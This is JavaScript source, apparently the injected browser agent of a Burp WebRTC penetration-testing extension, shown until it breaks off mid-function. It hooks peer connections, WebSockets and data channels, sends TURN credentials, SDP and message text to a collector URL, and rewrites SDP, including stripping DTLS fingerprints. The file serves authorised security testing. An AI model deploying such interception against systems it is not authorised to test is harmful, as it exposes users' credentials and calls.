/*
 * WebRTC Test Suite — generic browser agent (client-agnostic).
 * Hooks the standard W3C WebRTC API so it works on any WebRTC app regardless
 * of framework or signaling. Injected into the top page and every iframe by the
 * Burp extension's M1 injector. Config arrives via window.__WRTC_CFG__.
 * Versioned independently of the extension.
 */
(function () {
  "use strict";
  if (window.__WRTC_AGENT_ACTIVE__) return;
  window.__WRTC_AGENT_ACTIVE__ = true;

  var CFG = window.__WRTC_CFG__ || {};
  var COLLECT = CFG.collect;
  var COMMAND = CFG.command;
  var FRAME = (function () { try { return location.href; } catch (e) { return "frame"; } })();
  var AGENT_VERSION = "1.3.0";
  var AGENT_ID = "agent-" + Date.now().toString(36) + "-" + Math.random().toString(36).slice(2);
  var NativePeerConnection = window.RTCPeerConnection || window.webkitRTCPeerConnection;
  var NativeWebSocket = typeof window.WebSocket === "function" ? window.WebSocket : null;
  var channels = new Map();
  var wrappedChannels = new WeakSet();
  var channelSeq = 0;
  var seenCommands = new Set();
  var completedCommands = [];
  var activeCommand = null;
  var unloading = false;
  var mutationSeq = 0;
  var mutationStatus = "";
  var latestObservedOffer = "";
  var latestObservedAnswer = "";
  var statsSamples = new WeakMap();
  var peerMeta = new WeakMap();
  // Application peers, so a manual stats capture can find a live connection.
  var peersSeen = [];
  // Bounded automatic stats sampling: a short burst right after connect, then a
  // slower steady interval, capped per connection so long calls cannot flood.
  var STATS_MAX = 20, STATS_BURST = 5, STATS_INTERVAL_MS = 5000;

  var PRIVATE_RE = /\b(10\.\d{1,3}\.\d{1,3}\.\d{1,3}|172\.(1[6-9]|2\d|3[01])\.\d{1,3}\.\d{1,3}|192\.168\.\d{1,3}\.\d{1,3}|169\.254\.\d{1,3}\.\d{1,3}|fe80:[0-9a-f:]+|f[cd][0-9a-f]{2}:[0-9a-f:]+)/i;

  function isPrivate(text) {
    try { return PRIVATE_RE.test(String(text)); } catch (e) { return false; }
  }

  // DataChannel runner support. Every runner payload carries a unique marker so any
  // instrumented page that receives, renders or throws on it can prove recipient-side
  // observation; send() acceptance alone is never treated as delivery.
  var MARKER_RE = /wrtc[0-9a-z]{12}/g;
  var COLIBRI_PROTOCOL = "http://jitsi.org/protocols/colibri";
  var sockets = new Map();
  var socketSeq = 0;
  var nativeCreateChannel = new WeakMap();
  var learnedCounts = {};
  var endpointHints = [];
  var ownEndpoint = "";
  var observing = false, domObserver = null, domSeen = {}, domSeenCount = 0;
  var markerQueue = [], markerTimer = null, markersDropped = 0;
  var pageErrorCount = 0;
  var recvBudget = {};

  function findMarkers(text) {
    if (typeof text !== "string" || text.indexOf("wrtc") < 0) return [];
    var found = text.slice(0, 1048576).match(MARKER_RE) || [], unique = [];
    for (var i = 0; i < found.length && unique.length < 16; i++) if (unique.indexOf(found[i]) < 0) unique.push(found[i]);
    return unique;
  }

  // FNV-1a over UTF-16 code units: identical in sender and recipient pages, so a
  // replayed message can be matched without carrying a marker.
  function hash32(text) {
    var h = 0x811c9dc5;
    for (var i = 0; i < text.length; i++) { h ^= text.charCodeAt(i); h = Math.imul(h, 0x01000193) >>> 0; }
    return ("0000000" + h.toString(16)).slice(-8);
  }

  function parseEnvelope(text) {
    if (typeof text !== "string" || text.length > 1048576 || !/^\s*\{/.test(text)) return null;
    try {
      var obj = JSON.parse(text);
      if (!obj || typeof obj !== "object" || Array.isArray(obj)) return null;
      var body = {};
      Object.keys(obj).forEach(function (k) { if (k !== "from" && k !== "to") body[k] = obj[k]; });
      return { colibriClass: typeof obj.colibriClass === "string" ? obj.colibriClass.slice(0, 128) : "",
        from: typeof obj.from === "string" ? obj.from.slice(0, 128) : "", to: typeof obj.to === "string" ? obj.to.slice(0, 128) : "",
        payloadHash: hash32(obj.msgPayload !== undefined ? JSON.stringify(obj.msgPayload) : JSON.stringify(body)) };
    } catch (e) { return null; }
  }

  function bytesText(view) {
    var out = "", limit = Math.min(view.length, 65536);
    for (var i = 0; i < limit; i += 8192) out += String.fromCharCode.apply(null, Array.prototype.slice.call(view.subarray(i, Math.min(limit, i + 8192))));
    return out;
  }

  function binaryView(data) {
    try {
      // Tag check rather than instanceof: buffers can come from another frame's realm.
      if (Object.prototype.toString.call(data) === "[object ArrayBuffer]") return new Uint8Array(data);
      if (data && data.buffer && typeof data.byteLength === "number") return new Uint8Array(data.buffer, data.byteOffset || 0, data.byteLength);
    } catch (e) {}
    return null;
  }

  function queueMarker(entry) {
    if (markerQueue.length >= 2000) { markersDropped++; return; }
    markerQueue.push(entry);
    if (!markerTimer) markerTimer = setTimeout(flushMarkers, 250);
  }

  function flushMarkers() {
    markerTimer = null;
    var batch = markerQueue.splice(0, 250);
    if (batch.length) beacon({ type: "dc-markers", receipts: batch, dropped: markersDropped,
      detail: batch.length + " recipient observation(s)" + (markersDropped ? "; " + markersDropped + " dropped" : "") });
    if (markerQueue.length) markerTimer = setTimeout(flushMarkers, 250);
  }

  function rememberEndpoint(id) {
    if (id && id !== ownEndpoint && endpointHints.indexOf(id) < 0 && endpointHints.length < 32) endpointHints.push(id);
  }

  function learnKey(key) {
    learnedCounts[key] = (learnedCounts[key] || 0) + 1;
    return learnedCounts[key] <= 8;
  }

  // Inbound application data: marker receipts (and, while a runner observes, hash
  // receipts for replay matching) are batched; ordinary traffic is sampled.
  function observeIncoming(data, where) {
    var text = typeof data === "string" ? data : null, view = text === null ? binaryView(data) : null;
    var scan = text !== null ? text : view ? bytesText(view) : "";
    var envelope = text !== null ? parseEnvelope(text) : null;
    if (envelope && envelope.from) rememberEndpoint(envelope.from);
    var markers = findMarkers(scan), now = Date.now(), bytes = sizeOf(data);
    function receipt(marker) {
      return { marker: marker, kind: where.transport === "datachannel" ? "dc" : where.transport === "colibri-ws" ? "colibri-ws" : "ws",
        t: now, channelId: where.channelId || "", socketId: where.socketId || "", label: where.label || "", pc: where.pc || "",
        colibriClass: envelope ? envelope.colibriClass : "", from: envelope ? envelope.from : "", to: envelope ? envelope.to : "",
        bytes: bytes, binary: text === null, textHash: text !== null ? hash32(text) : "", payloadHash: envelope ? envelope.payloadHash : "" };
    }
    markers.forEach(function (m) { queueMarker(receipt(m)); });
    if (!markers.length && observing && where.transport !== "ws") queueMarker(receipt(""));
    if (!markers.length && typeof Blob !== "undefined" && data instanceof Blob && data.size) {
      data.slice(0, 65536).arrayBuffer().then(function (buffer) {
        findMarkers(bytesText(new Uint8Array(buffer))).forEach(function (m) { queueMarker(receipt(m)); });
      }).catch(function () {});
    }
    if (markers.length || where.transport === "ws") return;
    var key = (where.channelId || where.socketId) + ":" + Math.floor(now / 1000);
    recvBudget[key] = (recvBudget[key] || 0) + 1;
    if (recvBudget[key] > 20) return;
    if (Object.keys(recvBudget).length > 64) recvBudget = {};
    var event = { type: where.transport === "datachannel" ? "dc-recv" : "ws-colibri-recv", pc: where.pc || "", channelId: where.channelId || "",
      socketId: where.socketId || "", label: where.label || "", bytes: bytes, preview: text !== null ? text.slice(0, 512) : "[binary]" };
    if (envelope) { event.colibriClass = envelope.colibriClass; event.from = envelope.from; event.to = envelope.to; }
    if (text !== null && learnKey("recv:" + (where.channelId || where.socketId) + ":" + (event.colibriClass || ""))) {
      event.text = text.slice(0, 16384); event.truncated = text.length > 16384;
    }
    beacon(event);
  }

  function observeOutgoing(data, where) {
    var text = typeof data === "string" ? data : null, envelope = text !== null ? parseEnvelope(text) : null;
    var event = { type: where.transport === "datachannel" ? "dc-send" : "ws-colibri-send", pc: where.pc || "", channelId: where.channelId || "",
      socketId: where.socketId || "", label: where.label || "", bytes: sizeOf(data) };
    if (envelope) event.colibriClass = envelope.colibriClass;
    if (text !== null && learnKey("send:" + (where.channelId || where.socketId) + ":" + (event.colibriClass || ""))) {
      event.text = text.slice(0, 16384); event.truncated = text.length > 16384;
    }
    beacon(event);
  }

  function colibriHints(url) {
    var match = /\/colibri-ws\/([^\/?#]+)\/([^\/?#]+)\/([^\/?#]+)/.exec(url || "");
    if (!match) return null;
    function decode(v) { try { return decodeURIComponent(v); } catch (e) { return v; } }
    return { bridge: decode(match[1]), conference: decode(match[2]), endpoint: decode(match[3]) };
  }

  function wsState(ws) { return ["connecting", "open", "closing", "closed"][ws.readyState] || "unknown"; }

  // Colibri WebSocket bridge channels are registered as runner transports (the URL
  // and its pwd are preserved in full). Every other socket is scanned for markers only.
  function observeSocket(ws, url) {
    var hints = colibriHints(url);
    if (!hints) {
      ws.addEventListener("message", function (e) { if (typeof e.data === "string") observeIncoming(e.data, { transport: "ws" }); });
      return;
    }
    var id = "ws" + (++socketSeq), nativeSend = ws.send;
    sockets.set(id, { ws: ws, url: url, hints: hints, send: nativeSend, createdAt: Date.now() });
    if (sockets.size > 16) {
      var oldest = Array.from(sockets.keys()).find(function (k) { return sockets.get(k).ws.readyState === 3; });
      if (oldest) sockets.delete(oldest);
    }
    if (hints.endpoint) ownEndpoint = hints.endpoint;
    var where = { transport: "colibri-ws", socketId: id, label: "colibri-ws" };
    ws.send = function (data) {
      var result = nativeSend.apply(ws, arguments);
      observeOutgoing(data, where);
      return result;
    };
    function lifecycle(state, extra) {
      var event = { type: "ws-colibri", socketId: id, url: url, state: state, bridge: hints.bridge, conference: hints.conference,
        endpoint: hints.endpoint, detail: "Colibri WebSocket " + id + " " + state };
      Object.keys(extra || {}).forEach(function (k) { event[k] = extra[k]; });
      beacon(event);
      heartbeat();
    }
    ws.addEventListener("open", function () { lifecycle("open"); });
    ws.addEventListener("close", function (e) { lifecycle("closed", { code: e && e.code, reason: e && e.reason, wasClean: e && e.wasClean }); });
    ws.addEventListener("message", function (e) { observeIncoming(e.data, where); });
    lifecycle("created");
  }

  function wrapWebSocket() {
    if (!NativeWebSocket) return;
    function Wrapped(url, protocols) {
      var ws = arguments.length > 1 ? new NativeWebSocket(url, protocols) : new NativeWebSocket(url);
      try { observeSocket(ws, String(url)); } catch (e) {}
      return ws;
    }
    Wrapped.prototype = NativeWebSocket.prototype;
    Object.setPrototypeOf(Wrapped, NativeWebSocket);
    try { window.WebSocket = Wrapped; } catch (e) {}
  }

  // Application errors are recipient-side processing evidence; markers in the
  // message or stack tie them to the case that caused them.
  function watchPageErrors() {
    if (typeof window.addEventListener !== "function") return;
    function report(kind, message, stack) {
      if (++pageErrorCount > 100) return;
      var text = String(message || "") + "\n" + String(stack || ""), markers = findMarkers(text), now = Date.now();
      beacon({ type: "page-error", kind: kind, message: String(message || "").slice(0, 1024), stack: String(stack || "").slice(0, 2048),
        markers: markers, t: now, detail: kind + ": " + String(message || "").slice(0, 200) });
      markers.forEach(function (m) { queueMarker({ marker: m, kind: "error", t: now, detail: String(message || "").slice(0, 256) }); });
    }
    try {
      window.addEventListener("error", function (e) {
        // Resource load failures target an element; script errors carry a message or error.
        if (!e || (e.target && e.target.nodeType === 1) || (!e.message && !e.error)) return;
        report("error", e.message || (e.error && e.error.message), e.error && e.error.stack);
      }, true);
      window.addEventListener("unhandledrejection", function (e) {
        var reason = e && e.reason;
        report("unhandledrejection", reason && reason.message || String(reason), reason && reason.stack);
      });
    } catch (e) {}
  }

  // While a runner observes, rendered markers prove the recipient application
  // processed (displayed) a message, not just that its channel received it.
  function setObserving(on) {
    if (on === observing) return;
    observing = on;
    if (!on) { if (domObserver) { try { domObserver.disconnect(); } catch (e) {} } domObserver = null; return; }
    if (typeof MutationObserver !== "function" || typeof document === "undefined" || !document.documentElement) return;
    function scan(text) {
      findMarkers(text).forEach(function (m) {
        if (domSeen[m]) return;
        if (++domSeenCount > 5000) { domSeen = {}; domSeenCount = 0; }
        domSeen[m] = true;
        queueMarker({ marker: m, kind: "dom", t: Date.now() });
      });
    }
    try {
      domObserver = new MutationObserver(function (mutations) {
        for (var i = 0; i < mutations.length && i < 500; i++) {
          var m = mutations[i];
          if (m.type === "characterData") scan(m.target && m.target.data);
          else for (var j = 0; j < m.addedNodes.length && j < 50; j++) {
            var node = m.addedNodes[j];
            var text = node.nodeType === 3 ? node.data : node.textContent;
            if (text && text.length <= 65536) scan(text);
          }
        }
      });
      domObserver.observe(document.documentElement, { childList: true, subtree: true, characterData: true });
    } catch (e) {}
  }

  function base64Bytes(text) {
    var alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    var clean = String(text).replace(/[\s=]/g, ""), out = new Uint8Array(Math.floor(clean.length * 3 / 4)), bits = 0, value = 0, n = 0;
    for (var i = 0; i < clean.length; i++) {
      var v = alphabet.indexOf(clean.charAt(i));
      if (v < 0) throw new Error("Invalid base64 payload");
      value = (value << 6) | v; bits += 6;
      if (bits >= 8) { bits -= 8; out[n++] = (value >> bits) & 255; }
    }
    return out.subarray(0, n);
  }

  // Seeded PRNG (mulberry32): the case seed reproduces the exact random payload.
  function seeded(seed) {
    var a = seed >>> 0;
    return function () {
      a = (a + 0x6D2B79F5) >>> 0;
      var t = a;
      t = Math.imul(t ^ (t >>> 15), t | 1);
      t ^= t + Math.imul(t ^ (t >>> 7), t | 61);
      return ((t ^ (t >>> 14)) >>> 0) / 4294967296;
    };
  }

  // Build a runner payload from parts. Text kinds stay strings (UTF-8 measured);
  // binary kinds are assembled into ArrayBuffer, typed array, DataView or Blob.
  function buildPayload(spec, cap) {
    var parts = spec && Array.isArray(spec.parts) ? spec.parts : [];
    var kind = spec && spec.kind || "text";
    if (parts.length > 64) throw new Error("Too many payload parts");
    function count(p) {
      if (!Number.isInteger(p.count) || p.count < 0) throw new Error("Invalid payload part count");
      if (p.count > cap) throw new Error("Payload exceeds the per-message byte cap");
      return p.count;
    }
    if (kind === "text") {
      var s = "";
      parts.forEach(function (p) {
        if (typeof p.text === "string") s += p.text;
        else if (typeof p.repeat === "string" && p.repeat.length) s += p.repeat.repeat(count(p));
        else if (p.fill === "random") {
          var r = seeded(p.seed || 1), n = count(p), chars = [];
          for (var i = 0; i < n; i++) chars.push(String.fromCharCode(32 + Math.floor(r() * 95)));
          s += chars.join("");
        } else throw new Error("Invalid text payload part");
        if (s.length > cap) throw new Error("Payload exceeds the per-message byte cap");
      });
      if (sizeOf(s) > cap) throw new Error("Payload exceeds the per-message byte cap");
      return s;
    }
    var chunks = [], total = 0;
    parts.forEach(function (p) {
      var bytes;
      if (typeof p.text === "string") bytes = new TextEncoder().encode(p.text);
      else if (typeof p.base64 === "string") bytes = base64Bytes(p.base64);
      else if (typeof p.repeat === "string" && p.repeat.length) bytes = new TextEncoder().encode(p.repeat.repeat(Math.min(count(p), cap)));
      else if (p.fill === "zero") bytes = new Uint8Array(count(p));
      else if (p.fill === "random") {
        bytes = new Uint8Array(count(p));
        var r = seeded(p.seed || 1);
        for (var i = 0; i < bytes.length; i++) bytes[i] = Math.floor(r() * 256);
      } else throw new Error("Invalid binary payload part");
      total += bytes.length;
      if (total > cap) throw new Error("Payload exceeds the per-message byte cap");
      chunks.push(bytes);
    });
    var buffer = new Uint8Array(total), offset = 0;
    chunks.forEach(function (c) { buffer.set(c, offset); offset += c.length; });
    if (kind === "arraybuffer") return buffer.buffer;
    if (kind === "uint8array") return buffer;
    if (kind === "int16array") { if (total % 2) throw new Error("Int16Array payload needs an even byte count"); return new Int16Array(buffer.buffer); }
    if (kind === "float64array") { if (total % 8) throw new Error("Float64Array payload needs a multiple of 8 bytes"); return new Float64Array(buffer.buffer); }
    if (kind === "dataview") return new DataView(buffer.buffer);
    if (kind === "blob") { if (typeof Blob !== "function") throw new Error("Blob is unavailable in this page"); return new Blob([buffer]); }
    throw new Error("Unknown payload kind " + kind);
  }

  function previewOf(data) {
    if (typeof data === "string") return data.slice(0, 256);
    var view = binaryView(data);
    if (view) return Array.from(view.subarray(0, 64)).map(function (n) { return n.toString(16).padStart(2, "0"); }).join(" ");
    return "[blob " + sizeOf(data) + " bytes]";
  }

  function delay(ms) { return new Promise(function (resolve) { setTimeout(resolve, ms); }); }

  function beacon(event) {
    if (!COLLECT) return;
    try {
      event.frame = location.href || FRAME;
      event.agent = AGENT_ID;
      var body = JSON.stringify(event);
      return fetch(COLLECT, { method: "POST", body: body, mode: "no-cors", keepalive: body.length < 8000 })
        .catch(function () {});
    } catch (e) { /* never break the app */ }
  }

  var pcSeq = 0;
  // ICE server configurations observed on created peers, including TURN account
  // credentials. The tester controls evidence; nothing is masked or dropped here.
  var observedIceServers = [];

  function recordIceServers(cfg) {
    if (!cfg || !cfg.iceServers) return;
    for (var i = 0; i < cfg.iceServers.length; i++) {
      var s = cfg.iceServers[i];
      if (!s) continue;
      var entry = { urls: s.urls, username: s.username, credential: s.credential, credentialType: s.credentialType };
      var key = safeJson(entry);
      var seen = false;
      for (var j = 0; j < observedIceServers.length; j++) {
        if (safeJson(observedIceServers[j]) === key) { seen = true; break; }
      }
      if (!seen) observedIceServers.push(entry);
    }
  }

  function wrapPeerConnection() {
    var Native = NativePeerConnection;
    if (!Native) return;

    function Wrapped(cfg, constraints) {
      var pc = new Native(cfg, constraints);
      var pcId = "pc" + (++pcSeq);
      peerMeta.set(pc, { local: 0, remote: 0, restart: false });
      peersSeen.push({ pc: pc, pcId: pcId });
      if (peersSeen.length > 32) peersSeen.shift();
      // Preserve the full ICE configuration, including TURN usernames/credentials:
      // the tester decides what to remove from screenshots and report evidence.
      recordIceServers(cfg);
      beacon({ type: "pc-new", pc: pcId, detail: safeJson({
        iceServers: cfg && cfg.iceServers ? cfg.iceServers.map(function (s) {
          return { urls: s.urls, username: s.username, credential: s.credential, credentialType: s.credentialType };
        }) : [],
        iceTransportPolicy: cfg && cfg.iceTransportPolicy
      }) });

      pc.addEventListener("icecandidate", function (e) {
        if (e && e.candidate && e.candidate.candidate) {
          var cand = e.candidate.candidate;
          beacon({ type: "ice", pc: pcId, candidate: cand, stage: "gathered", generation: peerMeta.get(pc).local, sdpMid: e.candidate.sdpMid, usernameFragment: e.candidate.usernameFragment, private: isPrivate(cand) });
        }
      });

      // ICE can connect before DTLS. Sample again after the full connection
      // connects and keep sampling at a slow, bounded interval while connected.
      var statsTimer = null, statsLeft = 0, statsTaken = 0;
      function sampleStats() {
        statsTimer = null;
        if (unloading || pc.connectionState === "closed" || pc.signalingState === "closed") return;
        reportStats(pc, pcId);
        statsTaken++; statsLeft--;
        if (statsLeft > 0) statsTimer = setTimeout(sampleStats, statsTaken < STATS_BURST ? 1000 : STATS_INTERVAL_MS);
      }
      function connectionChanged() {
        var snapshot = peerState(pc);
        snapshot.type = "pc-state"; snapshot.pc = pcId;
        snapshot.detail = "peer=" + snapshot.connectionState + " ICE=" + snapshot.iceConnectionState +
          " signaling=" + snapshot.signalingState + " SCTP=" + snapshot.sctpState;
        beacon(snapshot);
        if (pc.connectionState === "closed" || pc.signalingState === "closed") {
          clearTimeout(statsTimer); statsTimer = null; statsLeft = 0;
          checkCaptureAfterClose(pcId);
          return;
        }
        if (pc.connectionState === "connected" || pc.iceConnectionState === "connected" || pc.iceConnectionState === "completed") {
          if (statsLeft <= 0) { statsLeft = STATS_MAX; statsTaken = 0; sampleStats(); }
        }
      }
      pc.addEventListener("iceconnectionstatechange", connectionChanged);
      pc.addEventListener("connectionstatechange", connectionChanged);
      pc.addEventListener("signalingstatechange", connectionChanged);
      var origClose = pc.close;
      if (typeof origClose === "function") pc.close = function () {
        var result = origClose.apply(pc, arguments);
        var event = peerState(pc);
        event.type = "pc-state"; event.pc = pcId; event.action = "close-called";
        event.detail = "RTCPeerConnection.close() called by page";
        event.stack = String(new Error().stack || "").slice(0, 2048);
        beacon(event);
        checkCaptureAfterClose(pcId);
        return result;
      };

      pc.addEventListener("datachannel", function (e) {
        if (e && e.channel) wrapDataChannel(e.channel, pcId, "remote", pc);
      });

      ["setConfiguration", "restartIce", "addTransceiver", "addTrack", "removeTrack"].forEach(function (method) {
        var nativeMethod = pc[method];
        if (typeof nativeMethod !== "function") return;
        pc[method] = function () {
          var result = nativeMethod.apply(pc, arguments);
          if (method === "restartIce") peerMeta.get(pc).restart = true;
          var config = method === "setConfiguration" ? (pc.getConfiguration ? pc.getConfiguration() : arguments[0]) : null;
          if (config) recordIceServers(config);
          beacon({ type: config ? "pc-config" : "pc-operation", pc: pcId, method: method,
            detail: config ? safeJson(config) : method + " accepted", iceTransportPolicy: config && config.iceTransportPolicy });
          return result;
        };
      });
      hookSdp(pc, pcId);
      hookCreateDataChannel(pc, pcId);
      return pc;
    }

    Wrapped.prototype = Native.prototype;
    Object.setPrototypeOf(Wrapped, Native);
    try {
      window.RTCPeerConnection = Wrapped;
      if (window.webkitRTCPeerConnection) window.webkitRTCPeerConnection = Wrapped;
    } catch (e) {}
  }

  function hookSdp(pc, pcId) {
    var pending = Promise.resolve(), lastLocalMutation = null;
    var nativeOffer = pc.createOffer, nativeAnswer = pc.createAnswer;
    function enqueue(action) {
      var result = pending.then(action);
      pending = result.catch(function () {});
      return result;
    }
    function callbackResult(promise, success, failure) {
      if (typeof success !== "function" && typeof failure !== "function") return promise;
      promise.then(typeof success === "function" ? success : function () {}, typeof failure === "function" ? failure : function () {});
      return undefined;
    }
    function record(desc, side, accepted, restart) {
      if (!desc || !desc.sdp) return;
      rememberSdp(desc);
      // A full-ICE remote is another participant; an ICE-lite remote is a media server.
      if (side === "remote" && accepted && /(^|\r?\n)a=ice-lite/.test(desc.sdp)) peerMeta.get(pc).iceLite = true;
      beacon({ type: "sdp-" + side, pc: pcId, kind: desc.type, sdp: desc.sdp,
        generation: peerMeta.get(pc)[side] + (accepted ? 0 : 1), accepted: accepted,
        iceRestart: !!restart, private: isPrivate(desc.sdp) });
    }
    ["createOffer", "createAnswer"].forEach(function (method) {
      var orig = pc[method];
      if (typeof orig !== "function") return;
      pc[method] = function () {
        var legacy = typeof arguments[0] === "function";
        var success = legacy ? arguments[0] : null, failure = legacy ? arguments[1] : null;
        var options = legacy ? arguments[2] : arguments[0];
        if (method === "createOffer" && options && options.iceRestart) peerMeta.get(pc).restart = true;
        var promise = enqueue(function () {
          return Promise.resolve(orig.call(pc, options)).then(function (desc) {
            return mutateDescription(desc, "local", method, pcId).then(function (change) {
              lastLocalMutation = change.id ? change : null;
              record(change.description, "local", false, peerMeta.get(pc).restart);
              return change.description;
            });
          });
        });
        return callbackResult(promise, success, failure);
      };
    });
    ["setLocalDescription", "setRemoteDescription", "addIceCandidate"].forEach(function (method) {
      var orig = pc[method];
      if (typeof orig !== "function") return;
      pc[method] = function () {
        var args = Array.prototype.slice.call(arguments), success = args[1], failure = args[2];
        var promise = enqueue(async function () {
          var desc = args[0], change = null;
          try {
            if (method === "setLocalDescription" && (!desc || !desc.type)) {
              var answer = pc.signalingState === "have-remote-offer" || pc.signalingState === "have-local-pranswer";
              desc = await (answer ? nativeAnswer : nativeOffer).call(pc);
              change = await mutateDescription(desc, "local", "setLocalDescription", pcId);
              desc = change.description;
            } else if (method === "setRemoteDescription") {
              change = await mutateDescription(desc, "remote", method, pcId);
              desc = change.description;
            } else if (method === "setLocalDescription") {
              if (lastLocalMutation && desc && desc.sdp === lastLocalMutation.description.sdp) change = lastLocalMutation;
              else { change = await mutateDescription(desc, "local", method, pcId); desc = change.description; }
            }
            var value = await orig.call(pc, desc);
            if (method === "addIceCandidate") {
              beacon({ type: "ice-input", pc: pcId, candidate: desc && desc.candidate || "", sdpMid: desc && desc.sdpMid,
                usernameFragment: desc && desc.usernameFragment, accepted: true, detail: "Candidate accepted locally; connectivity is not established" });
            } else if (desc && desc.type !== "rollback") {
              var side = method === "setLocalDescription" ? "local" : "remote", meta = peerMeta.get(pc);
              meta[side]++;
              record(desc, side, true, side === "local" && meta.restart);
              if (side === "local") meta.restart = false;
            } else beacon({ type: "pc-operation", pc: pcId, method: method, detail: "rollback accepted" });
            if (change && change.id) beacon({ type: "sdp-result", pc: pcId, method: method, mutationId: change.id, accepted: true, detail: method + " accepted" });
            return value;
          } catch (error) {
            beacon({ type: "sdp-error", pc: pcId, method: method, mutationId: change && change.id || "", accepted: false, detail: method + " rejected: " + cleanError(error) });
            throw error;
          }
        });
        return callbackResult(promise, success, failure);
      };
    });
  }

  function requestBridge(extra) {
    if (!COMMAND) return Promise.resolve(null);
    // No cached authorization: scope, host allow-list and enable flags are checked each time.
    var frame;
    try { frame = location.href; } catch (e) { return Promise.resolve(null); }
    var controller = new AbortController();
    var timer;
    var timeout = new Promise(function (_, reject) {
      timer = setTimeout(function () { controller.abort(); reject(new Error("bridge timeout")); }, 1500);
    });
    var query = "frame=" + encodeURIComponent(frame) + "&agent=" + encodeURIComponent(AGENT_ID);
    Object.keys(extra || {}).forEach(function (key) { query += "&" + encodeURIComponent(key) + "=" + encodeURIComponent(extra[key]); });
    var request = fetch(COMMAND + (COMMAND.indexOf("?") < 0 ? "?" : "&") + query,
      { method: "GET", cache: "no-store", signal: controller.signal })
      .then(function (r) { if (!r.ok) throw new Error("bridge HTTP " + r.status); return r.json(); });
    return Promise.race([request, timeout]).catch(function () { return null; })
      .then(function (doc) { clearTimeout(timer); return doc; });
  }

  function readMutationSettings() {
    return requestBridge().then(function (doc) {
      if (!doc) { announceMutationStatus("bridge unavailable; SDP unchanged"); return null; }
      var command = (Array.isArray(doc.commands) ? doc.commands : []).find(function (c) { return c.type === "sdp-mutation"; });
      var cfg = command && command.config;
      var active = cfg && cfg.enabled === true;
      announceMutationStatus(active ? "enabled: " + cfg.target : "disabled or page outside scope");
      return active ? cfg : null;
    });
  }

  function announceMutationStatus(detail) {
    if (detail === mutationStatus) return;
    mutationStatus = detail;
    beacon({ type: "sdp-mutation-status", detail: detail });
  }

  function applySdpRules(sdp, cfg) {
    if (sdp.length > 262144) throw new Error("SDP exceeds 256 KiB character limit");
    var newline = sdp.indexOf("\r\n") >= 0 ? "\r\n" : "\n";
    var trailing = /\r?\n$/.test(sdp);
    var lines = sdp.split(/\r?\n/);
    if (trailing) lines.pop();
    lines = lines.filter(function (line) {
      if (cfg.removeFingerprint && line.indexOf("a=fingerprint:") === 0) return false;
      if (cfg.removeCandidates && (line.indexOf("a=candidate:") === 0 || line === "a=end-of-candidates")) return false;
      return true;
    });
    if (["sendrecv", "sendonly", "recvonly", "inactive"].indexOf(cfg.mediaDirection) >= 0) {
      var output = [], section = [];
      function flush() {
        if (/^m=(audio|video) /.test(section[0] || "")) {
          section = section.filter(function (line) { return !/^a=(sendrecv|sendonly|recvonly|inactive)$/.test(line); });
          section.push("a=" + cfg.mediaDirection);
        }
        output = output.concat(section);
        section = [];
      }
      lines.forEach(function (line) { if (line.indexOf("m=") === 0) flush(); section.push(line); });
      flush();
      lines = output;
    }
    var out = lines.join(newline) + (trailing ? newline : "");
    var rules = Array.isArray(cfg.rules) ? cfg.rules :
      (typeof cfg.find === "string" && cfg.find.length ? [{ find: cfg.find, replacement: cfg.replacement || "" }] : []);
    for (var ruleIndex = 0; ruleIndex < rules.length; ruleIndex++) {
      var rule = rules[ruleIndex] || {};
      if (typeof rule.find !== "string" || !rule.find.length) continue;
      // Normalize line endings and replace literal substrings, not just whole SDP lines.
      var find = rule.find.replace(/\r?\n/g, newline);
      var replacement = String(rule.replacement || "").replace(/\r?\n/g, newline);
      var position = 0, projected = out.length;
      while ((position = out.indexOf(find, position)) >= 0) {
        projected += replacement.length - find.length;
        if (projected > 262144) throw new Error("mutated SDP exceeds 256 KiB character limit");
        position += find.length;
      }
      out = out.split(find).join(replacement);
    }
    if (out.length > 262144) throw new Error("mutated SDP exceeds 256 KiB character limit");
    return out;
  }

  function mutateDescription(desc, stage, method, pcId) {
    if (!desc || typeof desc.sdp !== "string" || !desc.sdp || desc.type === "rollback") {
      return Promise.resolve({ description: desc });
    }
    return readMutationSettings().then(function (cfg) {
      if (!cfg || (cfg.target !== stage && cfg.target !== "both") || (cfg.pcId && cfg.pcId !== pcId)) {
        return { description: desc };
      }
      try {
        var changed = applySdpRules(desc.sdp, cfg);
        if (changed === desc.sdp) return { description: desc };
        var id = pcId + "-m" + (++mutationSeq);
        beacon({ type: "sdp-mutation", pc: pcId, mutationId: id, stage: stage, method: method, kind: desc.type,
          detail: id + " " + method + " " + desc.sdp.length + " -> " + changed.length + " chars",
          before: desc.sdp.slice(0, 65536), after: changed.slice(0, 65536),
          truncated: desc.sdp.length > 65536 || changed.length > 65536,
          private: isPrivate(desc.sdp) || isPrivate(changed) });
        return { id: id, description: { type: desc.type, sdp: changed } };
      } catch (e) {
        beacon({ type: "sdp-error", pc: pcId, method: method, detail: "Mutation skipped: " + e.message });
        return { description: desc };
      }
    });
  }

  function hookCreateDataChannel(pc, pcId) {
    var orig = pc.createDataChannel;
    if (typeof orig !== "function") return;
    nativeCreateChannel.set(pc, orig);
    pc.createDataChannel = function () {
      var dc = orig.apply(pc, arguments);
      wrapDataChannel(dc, pcId, "local", pc);
      return dc;
    };
  }

  function wrapDataChannel(dc, pcId, origin, pc) {
    try {
      if (wrappedChannels.has(dc)) return;
      wrappedChannels.add(dc);
      var channelId = "dc" + (++channelSeq);
      var createdAt = Date.now(), everOpened = dc.readyState === "open", autoRequested = false;
      var origSend = dc.send;
      if (dc.protocol === COLIBRI_PROTOCOL || /^JVB data channel$/i.test(dc.label || "")) { var meta = peerMeta.get(pc); if (meta) meta.colibri = true; }
      channels.set(channelId, { dc: dc, pc: pc, pcId: pcId, send: origSend, origin: origin, createdAt: createdAt });
      var created = channelSummary(channelId, channels.get(channelId));
      created.type = "dc-created"; created.detail = origin; created.binaryType = dc.binaryType;
      beacon(created);
      function diagnostic(detail, action, error) {
        var event = peerState(pc);
        event.type = "dc-state"; event.pc = pcId; event.channelId = channelId; event.label = dc.label;
        event.state = dc.readyState; event.everOpened = everOpened; event.elapsedMs = Date.now() - createdAt;
        event.detail = detail;
        if (action) { event.action = action; event.stack = String(new Error().stack || "").slice(0, 2048); }
        if (error) {
          event.error = cleanError(error); event.errorDetail = error.errorDetail;
          event.sctpCauseCode = error.sctpCauseCode;
        }
        beacon(event);
      }
      function state() {
